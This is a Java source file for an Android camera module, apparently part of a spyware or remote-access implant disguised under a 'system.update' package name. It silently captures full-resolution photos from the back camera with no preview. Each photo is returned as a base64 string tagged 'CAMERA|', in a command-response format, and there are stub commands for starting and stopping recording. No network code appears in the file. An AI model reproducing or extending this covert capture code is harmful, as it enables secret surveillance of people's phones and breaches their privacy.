package com.android.system.update.modules;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.hardware.camera2.*;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Base64;
import android.util.Size;
import androidx.core.app.ActivityCompat;
import android.graphics.ImageFormat;
import android.util.Log;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.nio.ByteBuffer;

public class CameraModule {
    private static final String TAG = "CameraModule";
    private Context context;
    private CameraManager cameraManager;
    private String cameraId;
    private Handler backgroundHandler;
    private HandlerThread backgroundThread;
    private ImageReader imageReader;
    private CameraDevice cameraDevice;
    private CameraCaptureSession captureSession;
    private MediaRecorder mediaRecorder;
    private String videoFilePath;
    private boolean isRecording = false;
    private CameraCallback currentCallback;
    
    public interface CameraCallback {
        void onPhotoTaken(String base64Image);
        void onError(String error);
    }
    
    public CameraModule(Context context) {
        this.context = context;
        this.cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
        startBackgroundThread();
        
        // Get back camera by default
        try {
            for (String id : cameraManager.getCameraIdList()) {
                CameraCharacteristics chars = cameraManager.getCameraCharacteristics(id);
                Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
                if (facing != null && facing == CameraCharacteristics.LENS_FACING_BACK) {
                    cameraId = id;
                    Log.d(TAG, "Found back camera: " + id);
                    break;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error initializing camera", e);
        }
    }
    
    public String takePhoto() {
        Log.d(TAG, "takePhoto() called");
        
        if (!checkPermission()) {
            Log.e(TAG, "No camera permission");
            return "CAMERA|ERROR: No camera permission";
        }
        
        if (cameraId == null) {
            Log.e(TAG, "No camera available");
            return "CAMERA|ERROR: No camera available";
        }
        
        try {
            final File photoFile = File.createTempFile("photo", ".jpg", 
                context.getExternalFilesDir(null));
            
            // Use a semaphore to wait for the photo
            final Object lock = new Object();
            final String[] result = new String[1];
            final boolean[] completed = new boolean[1];
            
            cameraManager.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice device) {
                    Log.d(TAG, "Camera opened");
                    cameraDevice = device;
                    try {
                        Size largest = getLargestSize();
                        Log.d(TAG, "Using size: " + largest.getWidth() + "x" + largest.getHeight());
                        
                        imageReader = ImageReader.newInstance(largest.getWidth(), 
                            largest.getHeight(), ImageFormat.JPEG, 2);
                        
                        imageReader.setOnImageAvailableListener(reader -> {
                            try (Image image = reader.acquireLatestImage()) {
                                if (image != null) {
                                    Log.d(TAG, "Image captured");
                                    ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                                    byte[] bytes = new byte[buffer.remaining()];
                                    buffer.get(bytes);
                                    
                                    // Save to file
                                    FileOutputStream fos = new FileOutputStream(photoFile);
                                    fos.write(bytes);
                                    fos.close();
                                    
                                    // Read back and encode
                                    FileInputStream fis = new FileInputStream(photoFile);
                                    byte[] imageBytes = new byte[(int) photoFile.length()];
                                    fis.read(imageBytes);
                                    fis.close();
                                    
                                    String base64 = Base64.encodeToString(imageBytes, Base64.NO_WRAP);
                                    result[0] = "CAMERA|data:image/jpeg;base64," + base64;
                                    Log.d(TAG, "Photo captured, base64 length: " + base64.length());
                                    
                                    synchronized(lock) {
                                        completed[0] = true;
                                        lock.notify();
                                    }
                                    
                                    // Clean up
                                    photoFile.delete();
                                }
                            } catch (Exception e) {
                                Log.e(TAG, "Error processing image", e);
                                result[0] = "CAMERA|ERROR: " + e.getMessage();
                                synchronized(lock) {
                                    completed[0] = true;
                                    lock.notify();
                                }
                            }
                        }, backgroundHandler);
                        
                        // Create capture session
                        device.createCaptureSession(
                            java.util.Collections.singletonList(imageReader.getSurface()),
                            new CameraCaptureSession.StateCallback() {
                                @Override
                                public void onConfigured(CameraCaptureSession session) {
                                    captureSession = session;
                                    try {
                                        CaptureRequest.Builder builder = 
                                            device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                        builder.addTarget(imageReader.getSurface());
                                        builder.set(CaptureRequest.JPEG_QUALITY, (byte) 95);
                                        
                                        captureSession.capture(builder.build(), 
                                            new CameraCaptureSession.CaptureCallback() {
                                                @Override
                                                public void onCaptureCompleted(
                                                        @NonNull CameraCaptureSession session,
                                                        @NonNull CaptureRequest request,
                                                        @NonNull TotalCaptureResult result) {
                                                    Log.d(TAG, "Capture completed");
                                                }
                                            }, backgroundHandler);
                                    } catch (Exception e) {
                                        Log.e(TAG, "Error during capture", e);
                                        result[0] = "CAMERA|ERROR: " + e.getMessage();
                                        synchronized(lock) {
                                            completed[0] = true;
                                            lock.notify();
                                        }
                                    }
                                }
                                
                                @Override
                                public void onConfigureFailed(CameraCaptureSession session) {
                                    Log.e(TAG, "Configure failed");
                                    result[0] = "CAMERA|ERROR: Configure failed";
                                    synchronized(lock) {
                                        completed[0] = true;
                                        lock.notify();
                                    }
                                }
                            }, backgroundHandler
                        );
                    } catch (Exception e) {
                        Log.e(TAG, "Error setting up camera", e);
                        result[0] = "CAMERA|ERROR: " + e.getMessage();
                        synchronized(lock) {
                            completed[0] = true;
                            lock.notify();
                        }
                    }
                }
                
                @Override
                public void onDisconnected(CameraDevice device) {
                    Log.e(TAG, "Camera disconnected");
                    device.close();
                    cameraDevice = null;
                    result[0] = "CAMERA|ERROR: Camera disconnected";
                    synchronized(lock) {
                        completed[0] = true;
                        lock.notify();
                    }
                }
                
                @Override
                public void onError(CameraDevice device, int error) {
                    Log.e(TAG, "Camera error: " + error);
                    device.close();
                    cameraDevice = null;
                    result[0] = "CAMERA|ERROR: Camera error " + error;
                    synchronized(lock) {
                        completed[0] = true;
                        lock.notify();
                    }
                }
            }, backgroundHandler);
            
            // Wait for photo with timeout
            synchronized(lock) {
                try {
                    lock.wait(10000); // 10 second timeout
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                }
            }
            
            // Clean up
            closeCamera();
            
            if (result[0] != null) {
                return result[0];
            } else {
                return "CAMERA|ERROR: Timeout";
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error in takePhoto", e);
            closeCamera();
            return "CAMERA|ERROR: " + e.getMessage();
        }
    }
    
    public void startRecording(String args) {
        if (!checkPermission()) return;
        isRecording = true;
    }
    
    public String stopRecording() {
        isRecording = false;
        return "CAMERA|Recording stopped";
    }
    
    private Size getLargestSize() {
        try {
            CameraCharacteristics chars = cameraManager.getCameraCharacteristics(cameraId);
            StreamConfigurationMap configs = chars.get(
                CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
            Size[] sizes = configs.getOutputSizes(ImageFormat.JPEG);
            
            if (sizes == null || sizes.length == 0) {
                return new Size(1920, 1080);
            }
            
            Size largest = sizes[0];
            for (Size size : sizes) {
                if (size.getWidth() * size.getHeight() > largest.getWidth() * largest.getHeight()) {
                    largest = size;
                }
            }
            return largest;
        } catch (Exception e) {
            return new Size(1920, 1080);
        }
    }
    
    private void closeCamera() {
        try {
            if (captureSession != null) {
                captureSession.close();
                captureSession = null;
            }
            if (imageReader != null) {
                imageReader.close();
                imageReader = null;
            }
            if (cameraDevice != null) {
                cameraDevice.close();
                cameraDevice = null;
            }
        } catch (Exception e) {
            Log.e(TAG, "Error closing camera", e);
        }
    }
    
    private boolean checkPermission() {
        return ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
            == PackageManager.PERMISSION_GRANTED;
    }
    
    private void startBackgroundThread() {
        backgroundThread = new HandlerThread("CameraBackground");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
    }
}
